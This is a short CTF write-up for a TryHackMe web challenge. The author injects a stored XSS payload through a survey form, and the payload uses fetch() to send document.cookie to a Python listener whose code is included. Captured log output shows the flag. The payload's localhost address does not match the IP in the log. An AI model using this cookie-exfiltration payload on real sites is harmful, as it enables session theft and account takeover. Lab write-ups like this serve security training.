---
layout: post
title: "Cupid's matchmaker - CTF Writeup"
date: 2026-05-02 10:00:00 +0200
description: "Writeup for Cupid's matchmaker."
categories: [tryhackme]
tags: [tryhackme, web-security]
---

After inspecting the site, one small detail in the Survey stood out:
***Our team reads every word! Be creative and specific.***
when reading this i instantly thought about XSS.

```
<script>  
fetch('http://localhost:8000', {  
method: 'POST',  
mode: 'no-cors',  
body:document.cookie  
});  
</script>
```

this is a very simple payload which requires the site to have no real input validation.
I set up a python3 webserver using the following code:

```
from http.server import HTTPServer, SimpleHTTPRequestHandler
import json

class PostHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Log the POST data
        print(f"POST request received:")
        print(f"Path: {self.path}")
        print(f"Headers: {self.headers}")
        print(f"Body: {post_data.decode('utf-8')}")
        
        # Send response
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        response = {'status': 'success', 'received': post_data.decode('utf-8')}
        self.wfile.write(json.dumps(response).encode())

if __name__ == '__main__':
    server = HTTPServer(('localhost', 8000), PostHandler)
    print('Server running on http://localhost:8000')
    server.serve_forever()

```

to get the flag all i had to do is start the webserver by running: ***python3 server.py***
and sent the payload via the survey.

at the end i got the flag:

```
Body: flag=THM{XSS_CuP1d_Str1k3s_Ag41n}
10.66.169.156 - - [15/Feb/2026 09:45:15] "POST / HTTP/1.1" 200 -
POST request received:
Path: /
Headers: Host: 192.168.134.175:8000
Connection: keep-alive
Content-Length: 33
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/144.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://localhost:5000
Referer: http://localhost:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.